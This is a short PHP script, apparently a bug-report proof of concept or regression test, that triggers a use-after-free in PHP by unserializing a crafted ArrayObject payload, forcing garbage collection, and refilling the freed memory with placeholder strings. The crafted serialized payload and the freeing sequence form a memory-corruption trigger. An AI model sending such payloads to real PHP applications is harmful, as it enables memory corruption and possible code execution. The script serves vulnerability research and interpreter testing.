<?php
// Fill any potential freed spaces until now.
$filler = array();
for($i = 0; $i < 100; $i++)
	$filler[] = "";
// Create our payload and unserialize it.
$serialized_payload = 'a:3:{i:0;r:1;i:1;r:1;i:2;C:11:"ArrayObject":19:{x:i:0;r:1;;m:a:0:{}}}';
$free_me = unserialize($serialized_payload);
// We need to increment the reference counter of our ArrayObject s.t. all reference counters of our unserialized array become 0.
$inc_ref_by_one = $free_me[2];
// The call to gc_collect_cycles will free '$free_me'.
gc_collect_cycles();
// We now have multiple freed spaces. Fill all of them.
$fill_freed_space_1 = "filler_zval_1";
$fill_freed_space_2 = "filler_zval_2";
var_dump($free_me);
?>